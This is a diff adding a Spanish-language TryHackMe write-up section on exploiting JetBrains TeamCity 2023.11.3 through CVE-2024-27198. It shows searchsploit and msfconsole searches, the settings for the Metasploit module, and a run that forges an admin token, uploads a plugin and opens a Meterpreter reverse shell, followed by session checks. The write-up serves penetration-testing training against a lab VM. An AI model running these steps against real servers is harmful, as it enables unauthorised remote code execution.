@@ -75,7 +75,7 @@ Un atacante silencioso no deja notas, pero un buen auditor documenta cada paso.
 
 ---
 
-## Red Team
+# Red Team
 
 Establecemos conexión con la **VM** de **THM**..
 
@@ -153,7 +153,7 @@ Después de realizar el scan, podemos ver:
 - **Puerto 80**: Página estática de mantenimiento y sin contenido.
 - **Puerto 50000**: Panel de login de **JetBrains TeamCity**.
 
-### Posibles vectores de ataque
+## Posibles vectores de ataque
 
 ```mermaid
 flowchart TD
@@ -178,7 +178,7 @@ Accedemos al puerto `50000` via `http`:
 
 Versión identificada en **TeamCity 2023.11.3 (build 147512)**
 
-### Identificación de vulnerabilidad
+## Identificación de vulnerabilidad puerto:50000
 
 Investigamos las posibles CVE asociadas a **TeamCity 2023.11.3**. 
 
@@ -193,6 +193,127 @@ Ambas afectan a versiones anteriores a **2023.11.4**. Nuestro target (2023.11.3)
 
 Vector de ataque seleccionado: **CVE-2024-27198**: Permite control total sobre TeamCity sin autenticación.
 
+---
+
+## Buscamos Metasploit
+
+Primero buscaremos con `searchsploit` 
+```bash
+┌──(kali㉿kali)-[~]
+└─$ searchsploit teamcity
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                                                                                                                                                                            |  Path
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+JetBrains TeamCity 2018.2.4 - Remote Code Execution                                                                                                                                                                                                                                       | java/remote/47891.txt
+JetBrains TeamCity 2023.05.3 - Remote Code Execution (RCE)                                                                                                                                                                                                                                | java/remote/51884.py
+JetBrains TeamCity 2023.11.4 - Authentication Bypass                                                                                                                                                                                                                                      | multiple/webapps/52411.py
+TeamCity < 9.0.2 - Disabled Registration Bypass                                                                                                                                                                                                                                           | multiple/remote/46514.js
+TeamCity Agent - XML-RPC Command Execution (Metasploit)                                                                                                                                                                                                                                   | multiple/remote/45917.rb
+TeamCity Agent XML-RPC 10.0 - Remote Code Execution                                                                                                                                                                                                                                       | php/webapps/48201.py
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No results
+```
+
+Buscamos con `msfconsole`:
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ msfconsole -q -x "search teamcity"
+
+Matching Modules
+================
+
+   #   Name                                                      Disclosure Date  Rank       Check  Description
+   -   ----                                                      ---------------  ----       -----  -----------
+   0   auxiliary/scanner/teamcity/teamcity_login                 .                normal     No     JetBrains TeamCity Login Scanner
+   1   exploit/multi/http/jetbrains_teamcity_rce_cve_2023_42793  2023-09-19       excellent  Yes    JetBrains TeamCity Unauthenticated Remote Code Execution
+   2     \_ target: Windows                                      .                .          .      .
+   3     \_ target: Linux                                        .                .          .      .
+   4   exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198  2024-03-04       excellent  Yes    JetBrains TeamCity Unauthenticated Remote Code Execution
+   5     \_ target: Java                                         .                .          .      .
+   6     \_ target: Java Server Page                             .                .          .      .
+   7     \_ target: Windows Command                              .                .          .      .
+   8     \_ target: Linux Command                                .                .          .      .
+   9     \_ target: Unix Command                                 .                .          .      .
+   10  exploit/multi/misc/teamcity_agent_xmlrpc_exec             2015-04-14       excellent  Yes    TeamCity Agent XML-RPC Command Execution
+   11    \_ target: Windows                                      .                .          .      .
+   12    \_ target: Linux                                        .                .          .      .
+
+
+Interact with a module by name or index. For example info 12, use 12 or use exploit/multi/misc/teamcity_agent_xmlrpc_exec
+After interacting with a module you can manually set a TARGET with set TARGET 'Linux'
+```
+
+Tanto `searchsploit` como `msfconsole` confirman exploits específicos para **CVE-2024-27198** (`multiple/webapps/52411.py` y `exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198`), este último con rango *excellent* y soporte para target Linux, coincidiendo con nuestro vector seleccionado y el SO del servidor.
+
+## Explotación con Metasploit
+
+Cargamos el módulo correspondiente a la CVE seleccionada:
+
+```bash
+msf > use exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198
+[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
+```
+
+La descripción del módulo (`info`) confirma el mecanismo: el bypass de autenticación permite acceder a la API REST para crear un token (o cuenta) de administrador, que luego se usa para subir un plugin con el payload de Metasploit, logrando RCE no autenticado.
+
+Revisamos las opciones por defecto (`options`): `RPORT` apuntaba al **8111** y `RHOSTS`/`LHOST` estaban vacíos o mal configurados para nuestro entorno, por lo que ajustamos:
+
+```bash
+set RHOSTS 10.129.145.75
+set RPORT 50000
+set LHOST 192.168.131.81
+```
+
+El `LHOST` inicial apuntaba a la IP de `eth0` (red local), pero el target solo es alcanzable a través de la VPN de THM (`tun0`), por lo que fue necesario corregirlo para que el callback del reverse shell pueda llegar.
+
+Con la configuración ya consistente, validamos la vulnerabilidad sin explotar todavía (`check`):
+
+```bash
+msf exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > check
+[+] 10.129.145.75:50000 - The target is vulnerable. JetBrains TeamCity 2023.11.3 (build 147512) running on Linux.
+```
+
+El módulo confirma la vulnerabilidad e identifica correctamente la versión y el sistema operativo del target, coincidiendo con los datos obtenidos previamente por `nmap`.
+
+Ejecutamos el exploit:
+
+```bash
+msf exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > run
+[*] Started reverse TCP handler on 192.168.131.81:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target is vulnerable. JetBrains TeamCity 2023.11.3 (build 147512) running on Linux.
+[*] Created authentication token: eyJ0eXAiOiAiVENWMiJ9.V1d1WFJDQ1pfWm9mSFUxa0o0NnFzb0kwVEpj.ZmY2YjcwYzMtODIwNy00ZWQ1LTgwMzctNTJjMDUwMDBmMDg3
+[*] Uploading plugin: r4FAhePm
+[*] Sending stage (58073 bytes) to 10.129.145.75
+[*] Meterpreter session 1 opened (192.168.131.81:4444 -> 10.129.145.75:33852) at 2026-06-22 12:26:29 -0400
+[*] Deleting the plugin...
+[*] Deleting the authentication token...
+[!] This exploit may require manual cleanup of '/opt/teamcity/TeamCity/webapps/ROOT/plugins/r4FAhePm' on the target
+[!] This exploit may require manual cleanup of '/opt/teamcity/TeamCity/work/Catalina/localhost/ROOT/TC_147512_r4FAhePm' on the target
+[!] This exploit may require manual cleanup of '/home/ubuntu/.BuildServer/system/caches/plugins.unpacked/r4FAhePm' on the target
+
+meterpreter > 
+```
+
+El exploit funciona tal como describía su documentación: crea un token de admin, sube un plugin (`r4FAhePm`) con el payload, y obtiene una sesión de `Meterpreter`. El módulo intenta limpiar el token y el plugin automáticamente, aún advierte de rutas que podrían requerir limpieza manual.
+
+Validamos el contexto de la sesión obtenida:
+
+```bash
+meterpreter > getuid
+Server username: ubuntu
+meterpreter > sysinfo
+Computer        : ip-10-129-145-75
+OS              : Linux 5.15.0-1066-aws (amd64)
+Architecture    : x64
+System Language : en
+Meterpreter     : java/linux
+```
+
+La sesión se obtiene con el usuario **ubuntu** y no con **root**.
+
+Confirmado también por la ruta `/home/ubuntu/.BuildServer/` vista en la salida del exploit, que indica que el servicio TeamCity corre bajo ese usuario. Será necesario un proceso de escalada de privilegios para alcanzar root.
 
 
 
